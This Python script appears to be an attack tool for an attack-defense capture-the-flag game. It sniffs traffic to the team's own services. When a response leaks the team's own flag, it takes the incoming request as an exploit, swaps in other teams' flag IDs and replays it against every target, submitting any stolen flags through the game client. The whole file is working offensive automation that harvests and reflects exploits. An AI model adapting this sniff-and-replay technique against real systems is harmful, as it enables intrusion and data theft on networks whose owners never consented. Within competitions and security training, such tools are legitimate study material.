#!/usr/bin/env python3

import argparse
from scapy.all import *
from time import sleep
import _thread
import shlex
import re
import swpag_client

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10

active_connections = {}
my_client = {}
pwns = set()

def submit(flags, target):
    try:
        if not target and tuple(flags) in pwns:
            return True
        result = my_client['client'].submit_flag(list(map(lambda f: f.decode('ascii'), flags)))
        if target:
            return 'correct' in result
        if 'ownflag' in result or 'alreadysubmitted:ownflag' in result:
            pwns.add(tuple(flags))
            return True
    except RuntimeError:
        print(f'Error submitting flag target: {target}')
    return False

def find_keywords(raw_data):
    return re.findall(b'FLG[a-zA-Z0-9]+', raw_data)

def process_response(answered):
    # Check all response packet load for target team flags
    for (req, res) in answered:
        if Raw in res:
            raw_load = res[Raw].load
            flags = find_keywords(raw_load)
            if submit(flags, True):
                print(f"Counter-strike! Keyword {flags} found in response.")
                print(req[Raw].load if Raw in req else None, raw_load)
                return True
    return False

def replace_host_flag_id(load, flag_id, port):
    # Replace host team flag_id with target flag_id
    if port == 10001 or port == 10002:
        return re.sub(b'(?:\d\w){10}', flag_id.encode('ascii'), load,1)
    elif port == 1003:
        return re.sub(b'kid=\d{1,20}', ('kid='+flag_id).encode('ascii'), load,1)
    return re.sub(b'\d{3,20}', flag_id.encode('ascii'), load,1)

def send_tcp(interface, ip, port, loads, flag_id):
    try:
        s=socket.socket()
        s.connect((ip, port))
        ss=StreamSocket(s, Raw)
        for load in loads:
            (answered,unanswered) = ss.sr(Raw(replace_host_flag_id(load, flag_id, port)), verbose=False, timeout=1)
            if process_response(answered):
                break
    except TimeoutError:
        print(f'Timeout {ip}:{port}')

def send_udp(interface, ip, port, loads, flag_id):
    for load in loads:
        packet = IP(dst=ip)/UDP(dport=port, sport=33337)/replace_host_flag_id(load, flag_id)
        (answered,unanswered) = sr(packet, iface=interface, timeout=1, verbose=False)
        if process_response(answered):
            break

def replay(interface, key, connections, service):
    protocol, host_ip, host_port, other_ip, other_port = key
    # Get all the incoming raw_loads
    connections = list(map(lambda y: y[1], filter(lambda x: x[0] == 'in', connections)))
    for target in service['targets']:
        hostname = target['hostname']
        flag_id = target['flag_id']
        if protocol == 'UDP':
            send_udp(interface, hostname, host_port, connections, flag_id)
        else:
            send_tcp(interface, hostname, host_port, connections, flag_id)

def process(packet, interface, host_ip: str, port_to_service: dict):
    if not IP in packet: #IPv6
        return
    ip_payload = packet[IP].payload
    key = None # (host_ip, host_port, other_ip, other_port)
    direction = None
    protocol = 'TCP' if TCP in packet else 'UDP'

    # Collate packets to/from host team service ports
    if packet[IP].dst == host_ip and ip_payload.dport in port_to_service.keys():
        key = (protocol, packet[IP].dst, ip_payload.dport, packet[IP].src, ip_payload.sport)
        direction = 'in'
    elif packet[IP].src == host_ip and ip_payload.sport in port_to_service.keys():
        key = (protocol, packet[IP].src, ip_payload.sport, packet[IP].dst, ip_payload.dport)
        direction = 'out'
    else:
        return

    new_udp = False
    # prep new connection
    if TCP in packet and packet[TCP].flags & SYN and packet[TCP].flags & ACK:
        active_connections[key] = []
    elif UDP in packet and not key in active_connections:
        active_connections[key] = []
        new_udp = True

    # Check if packets contain host team flags
    if key in active_connections and Raw in packet:
        raw_data = packet[Raw].load
        active_connections[key].append((direction, raw_data))
        if direction == 'out':
            flags = find_keywords(raw_data)
            if submit(flags, False):
                host_port = key[2]
                print(f"Pwned! Keyword {flags} found in response. Port: {host_port}")
                list(map(print, active_connections[key]))
                # Execute replay attack in new thread
                _thread.start_new_thread(replay, (interface, key, active_connections[key], port_to_service[host_port]))

    # Remove closed connections from cache
    if key in active_connections:
        if UDP in packet and not new_udp:
            del active_connections[key]
        if TCP in packet and (packet[TCP].flags & FIN or packet[TCP].flags & RST):
            del active_connections[key]
        
def sniff_runner(interface, host_ip, port_to_service):
    def runner(packet):
        process(packet, interface, host_ip, port_to_service)
    return runner

def main():
    parser = argparse.ArgumentParser(description="Repeat repeat repeat...")
    parser.add_argument('--interface', type=str, required=True, help='the network interface to use')
    parser.add_argument('--game-address', type=str, required=True, help="the game ip address")
    parser.add_argument('--team-token', type=str, required=True, help="team authn token")
    args = parser.parse_args()

    host_ip = get_if_addr(args.interface)
    client = swpag_client.Team(f'http://{args.game_address}', args.team_token)
    my_client['client'] = client
    while True:
        service_list = client.get_service_list()
        for service in service_list:
            service['targets'] = client.get_targets(service['service_id'])

        # map port to service_list + target_info
        port_to_service = {service['port']:service for service in service_list}
        tick_info = client.get_tick_info()
        packet_handler = sniff_runner(args.interface, host_ip, port_to_service)

        # call sniff_runner with each packet until next tick
        sniff(iface=args.interface, session=TCPSession, filter='tcp or udp', prn=packet_handler,
            store=False, timeout=tick_info['approximate_seconds_left'])

if __name__ == '__main__':
    main()
